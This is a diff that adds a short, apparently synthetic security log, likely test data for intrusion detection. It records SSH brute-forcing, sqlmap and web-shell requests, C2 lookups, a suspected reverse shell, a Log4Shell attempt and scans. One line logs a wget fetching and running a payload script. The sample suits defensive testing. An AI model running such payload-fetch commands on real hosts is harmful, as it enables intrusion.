@@ -1,0 +1,16 @@
+
+2024-01-15 02:14:33 Failed password for root from 185.220.101.47 port 49823 ssh2
+2024-01-15 02:14:35 Failed password for admin from 185.220.101.47 port 49824 ssh2
+2024-01-15 02:14:37 Failed password for root from 45.33.32.156 port 12345 ssh2
+2024-01-15 02:16:10 GET /wp-login.php HTTP/1.1 200 - 91.108.4.23 "sqlmap/1.6.0"
+2024-01-15 02:17:00 POST /shell.php HTTP/1.1 200 - 91.108.4.23 "curl/7.68.0"
+2024-01-15 02:18:45 DNS query for malware-c2.xyz from 192.168.1.100
+2024-01-15 02:19:00 Outbound connection to 194.165.16.20:4444 reverse shell suspected
+2024-01-15 02:20:10 File hash detected: 5f4dcc3b5aa765d61d8327deb882cf99
+2024-01-15 02:21:00 CVE-2021-44228 exploit attempt from 45.155.205.233
+2024-01-15 02:22:30 User-Agent: Masscan/1.3 from 89.248.172.16
+2024-01-15 02:23:15 wget http://192.168.1.200/payload.sh executed on host
+2024-01-15 02:24:00 Email received from attacker@evil.tk with attachment
+2024-01-15 02:26:00 Connection to known C2: update-service.ml:8080
+2024-01-15 02:27:00 Nmap scan detected from 203.0.113.42
+2024-01-15 02:29:00 Outbound DNS to 185.220.101.47 for exfil-data.onion
